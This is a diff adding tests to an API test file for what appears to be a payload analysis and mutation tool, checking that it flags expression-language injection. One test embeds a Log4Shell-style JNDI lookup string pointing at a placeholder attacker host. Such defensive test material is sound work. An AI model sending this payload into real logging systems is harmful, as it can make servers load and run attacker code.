@@ -390,6 +390,30 @@ def test_mutate_graphql_endpoint():
     assert resp.json()["valid"] > 0
 
 
+def test_analyze_el_endpoint():
+    resp = client.post(
+        "/analyze",
+        json={
+            "template": "[INFO] user={INPUT}",
+            "payload": "${jndi:ldap://evil.example/a}",
+            "lang": "el",
+        },
+    )
+    assert resp.status_code == 200
+    data = resp.json()
+    assert data["dialect"] is None
+    assert data["context"] == "el_text"
+    assert data["risk"] == "CRITICAL"
+
+
+def test_mutate_el_endpoint():
+    resp = client.post(
+        "/mutate", json={"template": "[INFO] user={INPUT}", "lang": "el"}
+    )
+    assert resp.status_code == 200
+    assert resp.json()["valid"] > 0
+
+
 def test_fuzz_endpoint():
     resp = client.post(
         "/fuzz",
